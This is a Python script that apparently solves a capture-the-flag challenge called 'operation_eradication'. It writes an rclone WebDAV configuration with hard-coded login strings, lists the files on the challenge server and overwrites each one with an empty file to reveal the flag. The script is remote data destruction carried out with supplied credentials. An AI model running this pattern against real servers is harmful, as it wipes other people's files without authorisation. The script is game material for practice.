# operation_eradication
import os, subprocess, sys
try:
    isRclone = subprocess.check_output(['rclone', '--version'], text=True)

except FileNotFoundError:
    print(f'[+] Installing rclone')
    os.system('sudo apt install -y rclone')

port = input('[+] Start the machine and enter the port number: ')

print(f'[+] Creating config file...')
configContent = f'''[Eradication]
type = webdav
url = http://chal.ctf.games:{port}/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5'''
for i in configContent.split('\n'):
    os.system(f"echo {i} >> ~/.config/rclone/rclone.conf")

print(f'[+] Creating list of files to remove...')
fileList = subprocess.check_output(['rclone', 'ls', "Eradication:/"]).decode()

print(f'[+] Removing files...')
for i in fileList.split('\n'):
    if len(i) != 0:
        sys.stdout.write("\033[1F")
        sys.stdout.write("\033[J")
        print(f'[+] Removing "{i.split()[1]}"')
        file_name = i.split()[1].split('/')[-1]
        file_location = i.split()[1][:-len(file_name)]
        os.system(f'touch {file_name}')
        os.system(f'rclone copy {file_name} "Eradication:/{file_location}"')
        os.system(f'rm {file_name}')
print('[+] Check the web page for the flag')
